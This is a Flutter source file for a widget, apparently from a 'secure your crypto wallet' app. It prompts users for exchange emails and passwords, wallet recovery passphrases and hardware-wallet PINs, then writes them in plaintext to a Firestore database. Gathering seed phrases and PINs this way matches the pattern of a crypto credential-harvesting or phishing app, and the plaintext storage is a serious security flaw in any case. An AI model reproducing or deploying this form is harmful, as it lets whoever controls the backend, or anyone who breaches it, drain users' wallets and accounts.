import 'dart:core';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import '../../services/auth.dart';
import 'OverlayMessage.dart';

class ManageCryptoPassword extends StatefulWidget {
  const ManageCryptoPassword({super.key});

  @override
  State<ManageCryptoPassword> createState() => _ManageCryptoPasswordState();
}

final Authservices _auth = Authservices();

class _ManageCryptoPasswordState extends State<ManageCryptoPassword> {
  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
  String? _selectedItem;
  String _error = '';

  // Security options
  bool _isBianaceselected = true;
  bool _isCoinbaseSelected = false;
  bool _isTrustWalletSelected = false;
  bool _isMetaMaskSelected = false;
  bool _isCoinomiSelected = false;
  bool _isElectrumSelected = false;
  bool _isAtomicWalletSelected = false;
  bool _isExodusSelected = false;
  bool _isZengoSelected = false;
  bool _isKeepkeySelected = false;
  bool _isTrezoOneSelected = false;

  // Password visibility toggles
  bool _obscurePassword = true;
  bool _obscurePin = true;
  bool _obscurePassphrase = true;

  // Validators
  String? _pinValidator(String? value) => value?.isEmpty == true ? 'PIN cannot be empty' : null;
  String? _passwordValidator(String? value) => value?.isEmpty == true ? 'Password cannot be empty' : null;
  String? _passphraseValidator(String? value) => value?.isEmpty == true ? 'Recovery passphrase cannot be empty' : null;
  String? _emailValidator(String? value) {
    final RegExp emailRegex = RegExp(r'^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$');
    return value == null || !emailRegex.hasMatch(value) ? 'Enter a valid email' : null;
  }

  // Controllers
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  final TextEditingController _passphraseController = TextEditingController();
  final TextEditingController _pinController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        const SizedBox(height: 50),
        InkWell(
          highlightColor: Colors.blueGrey,
          onTap: () => _showDropdownDialog(context),
          child: Container(
            width: 420,
            padding: const EdgeInsets.all(16.0),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              color: const Color.fromARGB(255, 24, 146, 154),
              border: Border.all(width: 2, color: const Color.fromARGB(255, 24, 146, 154)),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.2),
                  spreadRadius: 2,
                  blurRadius: 5,
                  offset: const Offset(0, 3),
                ),
              ],
            ),
            child: Row(
              children: [
                Image.asset('assest/bitcoin.png', width: 60, height: 60),
                const SizedBox(width: 8),
                const Expanded(
                  child: Text(
                    'Secure your crypto wallets logins and tokens details',
                    style: TextStyle(fontSize: 20, fontFamily: 'Poppins-Regular', color: Colors.white),
                  ),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  void _showDropdownDialog(BuildContext context) {
    showDialog(
      context: context,
      builder: (BuildContext context) {
        return StatefulBuilder(
          builder: (BuildContext context, StateSetter setState) {
            return Stack(
              children: [
                Positioned(
                  bottom: 160,
                  left: 20,
                  right: 20,
                  child: Form(
                    key: _formKey,
                    child: AlertDialog(
                      title: const Text(
                        'Secure your wallet details',
                        style: TextStyle(color: Color.fromARGB(255, 24, 146, 154)),
                      ),
                      content: SizedBox(
                        width: 500,
                        child: SingleChildScrollView(
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              DropdownButton<String>(
                                hint: const Text('Select an option'),
                                isExpanded: true,
                                value: _selectedItem,
                                items:_dropdownItems.map((item){
                                  return DropdownMenuItem<String>(
                                    value: item['label'],
                                  child: Row(
                                  children:[
                                    Image.asset(item['image']!,
                                    height:40,
                                    width:40),
                                SizedBox(width: 8,),
                                Text(item['label']!)

                                  ],
                                  ),
                                  );
                                }).toList(),
                                onChanged: (newValue) {
                                  setState(() {
                                    _selectedItem = newValue;
                                    _updateSelection(newValue);
                                  });
                                },
                              ),
                              const SizedBox(height: 16),
                              _buildTextField(
                                controller: _emailController,
                                label: 'Enter your login email',
                                validator: _emailValidator,
                                obscureText: false,
                                isVisible: _isBianaceselected || _isCoinbaseSelected,
                              ),
                              const SizedBox(height: 16),
                              _buildTextField(
                                controller: _passwordController,
                                label: 'Password',
                                validator: _passwordValidator,
                                obscureText: _obscurePassword,
                                isVisible: _isBianaceselected || _isCoinbaseSelected || _isTrustWalletSelected || _isMetaMaskSelected || _isCoinomiSelected || _isElectrumSelected || _isAtomicWalletSelected || _isExodusSelected,
                                toggleVisibility: () => setState(() => _obscurePassword = !_obscurePassword),
                              ),
                              const SizedBox(height: 16),
                              if (_isTrustWalletSelected || _isMetaMaskSelected || _isCoinomiSelected || _isElectrumSelected || _isAtomicWalletSelected)
                                _buildTextField(
                                  controller: _passphraseController,
                                  label: 'Passphrase',
                                  validator: _passphraseValidator,
                                  obscureText: _obscurePassphrase,
                                  isVisible: true,
                                  toggleVisibility: () => setState(() => _obscurePassphrase = !_obscurePassphrase),
                                ),
                              const SizedBox(height: 16),
                              if (_isZengoSelected || _isKeepkeySelected || _isTrezoOneSelected)
                                _buildTextField(
                                  controller: _pinController,
                                  label: 'PIN',
                                  validator: _pinValidator,
                                  obscureText: _obscurePin,
                                  isVisible: true,
                                  keyboardType: TextInputType.number,
                                  toggleVisibility: () => setState(() => _obscurePin = !_obscurePin),
                                ),
                            ],
                          ),
                        ),
                      ),
                      actions: [
                        TextButton(
                          onPressed: () {
                            _clearControllers();
                            Navigator.of(context).pop();
                          },
                          child: const Text('Cancel', style: TextStyle(color: Color.fromARGB(255, 24, 146, 154))),
                        ),
                        TextButton(
                          onPressed: () async {
                            if (_formKey.currentState!.validate()) {
                              await _saveData();
                              Navigator.of(context).pop();
                            }
                          },
                          child: const Text('Save', style: TextStyle(color: Color.fromARGB(255, 24, 146, 154))),
                        ),
                      ],
                    ),
                  ),
                ),
              ],
            );
          },
        );
      },
    );
  }

  Widget _buildTextField({
    required TextEditingController controller,
    required String label,
    required FormFieldValidator<String> validator,
    required bool obscureText,
    required bool isVisible,
    TextInputType keyboardType = TextInputType.text,
    VoidCallback? toggleVisibility,
  }) {
    if (!isVisible) return const SizedBox.shrink();

    return TextFormField(
      controller: controller,
      obscureText: obscureText,
      validator: validator,
      style: const TextStyle(fontSize: 20),
      keyboardType: keyboardType,
      decoration: InputDecoration(
        suffixIcon: toggleVisibility != null ? IconButton(
          onPressed: toggleVisibility,
          icon: Icon(
            obscureText ? Icons.visibility : Icons.visibility_off,
            color: obscureText ? Colors.grey : const Color.fromARGB(255, 24, 146, 154),
          ),
        ) : null,
        focusedBorder: const UnderlineInputBorder(
          borderSide: BorderSide(width: 2, color: Color.fromARGB(255, 24, 146, 154)),
        ),
        labelStyle: const TextStyle(color: Color.fromARGB(255, 24, 146, 154), fontSize: 20),
        labelText: label,
      ),
    );
  }

  void _updateSelection(String? newValue) {
    _isBianaceselected = newValue == 'Binance';
    _isCoinbaseSelected = newValue == 'Coinbase';
    _isTrustWalletSelected = newValue == 'Trust Wallet';
    _isMetaMaskSelected = newValue == 'Metamask';
    _isCoinomiSelected = newValue == 'Coinomi';
    _isElectrumSelected = newValue == 'Electrum';
    _isAtomicWalletSelected = newValue == 'Atomic Wallet';
    _isExodusSelected = newValue == 'Exodus';
    _isZengoSelected = newValue == 'Zengo';
    _isKeepkeySelected = newValue == 'Keep Key';
    _isTrezoOneSelected = newValue == 'Trezo';
  }

  Future<void> _saveData() async {
    final selectedItem = _selectedItem;
    final passphrase = _passphraseController.text.trim();
    final pin = _pinController.text.trim();
    final password = _passwordController.text.trim();
    final email = _emailController.text.trim();

    if (selectedItem == null) return;

    User? user = FirebaseAuth.instance.currentUser;
    if (user == null) {
      _error = 'No user is currently signed in.';
      _showOverlayMessage(context, _error);
      return;
    }

    String collectionPath;
    Map<String, dynamic> documentData;

    if (_isCoinbaseSelected || _isBianaceselected) {
      collectionPath = 'coinbian';
      documentData = {'email': email, 'password': password};
    } else if (_isTrustWalletSelected || _isMetaMaskSelected || _isCoinomiSelected || _isElectrumSelected || _isAtomicWalletSelected) {
      collectionPath = 'softWallet';
      documentData = {'passphrase': passphrase};
    } else if (_isZengoSelected || _isKeepkeySelected || _isTrezoOneSelected) {
      collectionPath = 'HardwareWallet';
      documentData = {'PIN': pin};
    } else {
      collectionPath = 'Exodus';
      documentData = {'password': password};
    }

    try {
      await FirebaseFirestore.instance
          .collection('users')
          .doc(user.uid)
          .collection(collectionPath)
          .add(documentData);
      _showOverlayMessage(context, 'Data saved successfully');
    } catch (e) {
      _error = 'Error adding document: $e';
      _showOverlayMessage(context, _error);
    }

    _clearControllers();
  }

  void _clearControllers() {
    _passwordController.clear();
    _emailController.clear();
    _passphraseController.clear();
    _pinController.clear();
  }

  final List<Map<String, String>> _dropdownItems = [
    {'label': 'Binance', 'image': 'assest/binance.png'},
    {'label': 'Coinbase', 'image': 'assest/coinbase.png'},
    {'label': 'Metamask', 'image': 'assest/fox.png'},
    {'label': 'Trust Wallet', 'image': 'assest/trust-wallet-token.png'},
    {'label': 'Coinomi', 'image': 'assest/coinomi.png'},
    {'label': 'Electrum', 'image': 'assest/electrum.png'},
    {'label': 'Atomic Wallet', 'image': 'assest/atomic.png'},
    {'label': 'Exodus', 'image': 'assest/exodus.png'},
    {'label': 'Keep Key', 'image': 'assest/keepkey.jpg'},
    {'label': 'Zengo', 'image': 'assest/zengo.png'},
    {'label': 'Trezo', 'image': 'assest/trezo.png'},
  ];

  void _showOverlayMessage(BuildContext context, String message) {
    final overlay = Overlay.of(context);
    final overlayEntry = OverlayEntry(
      builder: (context) => Positioned(
        bottom: 50.0,
        left: MediaQuery.of(context).size.width * 0.1,
        right: MediaQuery.of(context).size.width * 0.1,
        child: OverlayMessage(message: message),
      ),
    );
    overlay.insert(overlayEntry);
    Future.delayed(const Duration(seconds: 3), () => overlayEntry.remove());
  }
}
